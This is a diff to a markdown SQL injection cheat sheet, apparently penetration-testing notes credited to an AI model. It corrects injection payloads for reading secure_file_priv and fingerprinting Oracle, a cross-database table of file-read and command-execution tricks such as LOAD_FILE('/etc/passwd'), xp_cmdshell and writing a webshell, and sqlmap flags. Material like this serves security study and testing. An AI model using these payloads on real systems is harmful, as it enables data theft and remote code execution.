@@ -6,7 +6,7 @@
 
 SQL injection occurs when unsanitized user input is inserted directly into a SQL query, allowing an attacker to modify query logic, dump data, write files, or execute OS commands.
 
-**Injection points:** GET/POST parameters, cookies, HTTP headers (X-Forwarded-For, User-Agent, Referer), JSON/XML body fields.
+**Injection points:** GET/POST parameters, cookies, HTTP headers (X-Forwarded-For, User-Agent, Referer), JSON/XML body fields. Pairs with [[NoSQL Injection]], [[Web Attacks]], [[File Inclusion]].
 
 **Categories:**
 
@@ -174,8 +174,11 @@ SHOW DATABASES;
 ### Check secure_file_priv (file write restriction)
 
 ```sql
-' UNION SELECT NULL,variable_value,NULL FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
+-- MySQL 5.7+/8.0 removed global_variables from information_schema — use the system var:
+' UNION SELECT NULL,@@secure_file_priv,NULL-- -
+-- (legacy 5.6: ...FROM information_schema.global_variables WHERE variable_name='secure_file_priv')
 -- Empty value = no restriction, can write anywhere
+-- A directory path = writes only allowed there
 -- NULL = writes disabled entirely
 ```
 
@@ -356,7 +359,7 @@ Used when there's no visible response and time-based is unreliable. Exfil data v
 | **List tables** | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `ALL_TABLES` |
 | **List columns** | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` | `ALL_TAB_COLUMNS` |
 | **Sleep** | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `DBMS_LOCK.SLEEP(5)` |
-| **String concat** | `concat(a,b)` or `a,0x3a,b` | `a+b` | `a\|\|b` | `a\|\|b` |
+| **String concat** | `concat(a,0x3a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
 | **File read** | `LOAD_FILE('/etc/passwd')` | `BULK INSERT` / `OPENROWSET` | `COPY TO` | `UTL_FILE` |
 | **RCE** | `INTO OUTFILE` → webshell | `xp_cmdshell` | `COPY FROM PROGRAM` | `DBMS_SCHEDULER` / Java |
 
@@ -415,7 +418,7 @@ Execute multiple SQL statements separated by `;`. Allows chaining arbitrary quer
 |------|----------------|-------|
 | MSSQL | Yes | Full support |
 | PostgreSQL | Yes | Full support |
-| MySQL | Conditional | Depends on API (mysqli supports, PDO may not) |
+| MySQL | Conditional | `mysqli::query()` blocks stacking (only `multi_query()` allows it); `PDO_MySQL` with emulated prepares often permits it |
 | Oracle | No | Not supported |
 
 **Syntax:**
@@ -493,8 +496,9 @@ Oracle differs significantly — all `SELECT` statements require a `FROM` clause
 **Fingerprint:**
 
 ```sql
-' AND 1=1 FROM dual-- -      -- if no error, likely Oracle
+-- Oracle requires FROM in every SELECT — a UNION that only works WITH "FROM dual" = Oracle
 ' UNION SELECT NULL FROM dual-- -
+-- (a plain ' UNION SELECT NULL-- - would error on Oracle but succeed on MySQL/MSSQL)
 ```
 
 **Basic enumeration:**
@@ -684,7 +688,7 @@ sqlmap -u "http://target.com/page?id=1" --sql-shell
 --technique=B        # Boolean blind
 --technique=T        # Time blind
 --technique=E        # Error-based
---technique=BEUST    # All
+--technique=BEUSTQ   # All (B=boolean E=error U=union S=stacked T=time Q=inline)
 
 # Specify DBMS to skip detection
 --dbms=mysql
@@ -789,5 +793,5 @@ sqlmap -u "http://target.com/page?id=1" --sql-shell
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
